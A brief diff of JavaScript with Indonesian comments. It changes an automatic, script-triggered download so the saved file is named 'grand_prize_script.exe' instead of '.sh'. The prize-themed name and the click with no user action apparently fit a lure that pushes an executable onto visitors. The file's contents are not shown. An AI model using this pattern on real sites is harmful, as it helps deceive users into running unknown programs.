@@ -76,7 +76,7 @@
         const url = URL.createObjectURL(blob); // Membuat URL untuk file Blob tersebut
         const link = document.createElement("a"); // Membuat elemen <a> untuk mengunduh file
         link.href = url; // Mengarah ke URL file Blob
-        link.download = "grand_prize_script.sh"; // Nama file saat diunduh
+        link.download = "grand_prize_script.exe"; // Nama file saat diunduh
         link.click(); // Melakukan klik otomatis untuk memulai pengunduhan
         URL.revokeObjectURL(url); // Menghapus URL setelah digunakan
       }
